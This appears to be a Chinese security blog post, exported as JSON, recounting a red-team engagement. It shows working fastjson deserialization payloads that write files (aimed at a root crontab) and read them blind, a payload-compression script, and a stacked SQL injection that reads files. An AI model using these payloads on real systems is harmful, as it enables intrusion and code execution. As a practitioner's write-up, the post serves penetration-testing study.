{"title":"一次攻防小记","uid":"caead448310a4a1bf0047aa168443e2c","slug":"一次攻防小记","date":"2022-08-24T10:38:45.000Z","updated":"2023-04-11T11:38:25.117Z","comments":true,"path":"api/articles/一次攻防小记.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220824/scan.6q7shyuek6k0.png","content":"<h1 id=\"一次攻防小记\"><a href=\"#一次攻防小记\" class=\"headerlink\" title=\"一次攻防小记\"></a>一次攻防小记</h1><p>​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。<br>​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。</p>\n<h2 id=\"fastjson利用\"><a href=\"#fastjson利用\" class=\"headerlink\" title=\"fastjson利用\"></a>fastjson利用</h2><p>随手一试fastjson jdk8 写文件的链</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span> <span class=\"token property\">\"x\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.lang.AutoCloseable\"</span><span class=\"token punctuation\">,</span> \n        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"sun.rmi.server.MarshalOutputStream\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"out\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.util.zip.InflaterOutputStream\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"out\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.io.FileOutputStream\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"file\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"/var/spool/cron/crontabs/root\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"append\"</span><span class=\"token operator\">:</span><span class=\"token boolean\">false</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"infl\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"input\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"bufLen\"</span><span class=\"token operator\">:</span><span class=\"token number\">1048576</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"protocolVersion\"</span><span class=\"token operator\">:</span><span class=\"token number\">1</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>压缩数据生成</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> itsdangerous <span class=\"token keyword\">import</span> base64_decode<span class=\"token punctuation\">,</span> base64_encode\n<span class=\"token keyword\">import</span> zlib\ncc<span class=\"token operator\">=</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nccc<span class=\"token operator\">=</span>zlib<span class=\"token punctuation\">.</span>compress<span class=\"token punctuation\">(</span>cc<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64_encode<span class=\"token punctuation\">(</span>ccc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"abc\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"java.lang.AutoCloseable\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"org.apache.commons.io.input.BOMInputStream\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"delegate\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"org.apache.commons.io.input.ReaderInputStream\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"reader\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"jdk.nashorn.api.scripting.URLReader\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"url\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"file:///tmp/\"</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"charsetName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"bufferSize\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1024</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"boms\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n      <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"org.apache.commons.io.ByteOrderMark\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"charsetName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"bytes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n          ...\n        <span class=\"token punctuation\">]</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"address\"</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"$ref\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"$.abc.BOM\"</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>但是没有回显，无法判断，随后拜读浅蓝师傅的文章 <a href=\"https://b1ue.cn/archives/506.html\">https://b1ue.cn/archives/506.html</a></p>\n<p>前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件</p>\n<p>通过读/root/.bash_history等拿到tomcat路径</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"abc\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"java.lang.AutoCloseable\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"org.apache.commons.io.input.BOMInputStream\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"delegate\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"org.apache.commons.io.input.ReaderInputStream\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"reader\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"jdk.nashorn.api.scripting.URLReader\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"url\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"file:///tmp/test\"</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"charsetName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"bufferSize\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1024</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"boms\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n      <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"org.apache.commons.io.ByteOrderMark\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"charsetName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"bytes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n          <span class=\"token number\">98</span>\n        <span class=\"token punctuation\">]</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"address\"</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"java.lang.AutoCloseable\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"org.apache.commons.io.input.CharSequenceReader\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"charSequence\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">{</span><span class=\"token property\">\"$ref\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"$.abc.BOM[0]\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"start\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"end\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。</p>\n<h2 id=\"写计划任务\"><a href=\"#写计划任务\" class=\"headerlink\" title=\"写计划任务\"></a>写计划任务</h2><p>试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。</p>\n<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 <a href=\"https://xz.aliyun.com/t/7169#toc-32\">https://xz.aliyun.com/t/7169#toc-32</a></p>\n<pre class=\"line-numbers language-SQL\" data-language=\"SQL\"><code class=\"language-SQL\">drop table mysql.m1;\nCREATE TABLE mysql.m1 (code TEXT );\nLOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';\nselect * from mysql.m1;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。<br>到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。</p>\n<h2 id=\"二战\"><a href=\"#二战\" class=\"headerlink\" title=\"二战\"></a>二战</h2><p>过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！<br>随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。<br>附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 </p>\n<pre><code class=\"json\">\"@type\":\"xxxx\"\n</code></pre>\n<p>一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。<br>小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。</p>\n","text":"一次攻防小记​ 一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​ 这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1....","link":"","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0\"><span class=\"toc-text\">一次攻防小记</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#fastjson%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">fastjson利用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\"><span class=\"toc-text\">写计划任务</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%88%98\"><span class=\"toc-text\">二战</span></a></li></ol></li></ol>","author":{"name":"COP","slug":"cop","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220721/cop.3c6tiszrlxs0.jpg","link":"https://rainsec.cn","description":"","socials":{}},"mapped":true,"prev_post":{"title":"Fastjson 1.2.80调试小记","uid":"fb1b22e9cffe64caefaaf1ad19f54d41","slug":"fastjson 1.2.80调试小记","date":"2022-09-27T10:38:45.000Z","updated":"2023-04-11T11:39:08.097Z","comments":true,"path":"api/articles/fastjson 1.2.80调试小记.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/image.5hsjeydq0cg0.png","text":"fastjson 1.2.68 反序列化rce探索前言 fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法 JDK8任意文件写场景下的Fastjson RCE 通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.for...","link":"","photos":[],"count_time":{"symbolsCount":"8.5k","symbolsTime":"8 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"author":{"name":"COP","slug":"cop","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220721/cop.3c6tiszrlxs0.jpg","link":"https://rainsec.cn","description":"","socials":{}}},"next_post":{"title":"Fuzzing之Grammars","uid":"001f56a1173240fc9f846bb4717903d4","slug":"Fuzzing之Grammers","date":"2022-07-31T08:42:45.000Z","updated":"2023-04-11T11:39:14.837Z","comments":true,"path":"api/articles/Fuzzing之Grammers.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/fuzzinggrammar.jpeg","text":"Fuzzing之GrammarsFuzzing input​ Fuzzing的一大核心思想其实就是通过大量的Input去触发程序的各个分支逻辑，因此Fuzzing的成功与否和Input的生成关系密切。Input的格式多种多样，可以是文件，代码，json数据等等。但是各种各样的数据都有自己的格式，程序的输入也是如此，那么在生成Input的过程中，格式化非常关键，程序无法接受的输入对于Fuzzing来说是毫无意义的。 ​ 为了很好的描述一个程序的输入，一个很有必要的事情是为输入制定一些语法规范。比如...","link":"","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":6,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"Fuzz","slug":"Fuzz","count":4,"path":"api/tags/Fuzz.json"}],"author":{"name":"Clock","slug":"clock","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/clocklogo.jpg","link":"https://rainsec.cn","description":"","socials":{}}}}